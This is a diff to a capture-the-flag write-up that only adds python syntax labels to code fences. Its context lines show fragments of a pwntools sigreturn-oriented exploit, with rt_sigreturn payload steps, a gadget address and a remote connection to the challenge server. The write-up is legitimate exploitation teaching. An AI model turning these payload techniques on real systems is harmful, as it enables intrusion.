@@ -150,7 +150,7 @@ lol
 
 ## Exploit
 
-```
+```python
 #!/usr/bin/python3
 
 from pwn import *
@@ -175,7 +175,7 @@ There are at least two options (_clever_ and _not to clever_) to call `sigreturn
 
 Clever:
 
-```
+```python
 payload += p64(constants.SYS_rt_sigreturn)
 payload += p64(binary.symbols['fn2'])
 ```
@@ -186,7 +186,7 @@ The clever way puts the `rt_sigreturn` syscall number in RBP.  Then overwrites t
 
 Not so clever:
 
-```
+```python
 payload += p64(0x0)
 payload += p64(0x00401004) # pop rax
 payload += p64(constants.SYS_rt_sigreturn)
@@ -196,13 +196,13 @@ The other option is to just write anything to the saved base pointer in the stac
 
 In either case the generated stack frame needs to follow the overwritten return address:
 
-```
+```python
 payload += bytes(frame)
 ```
 
 Finally:
 
-```
+```python
 #p = process(binary.path)
 p = remote('jh2i.com', 50036)
 
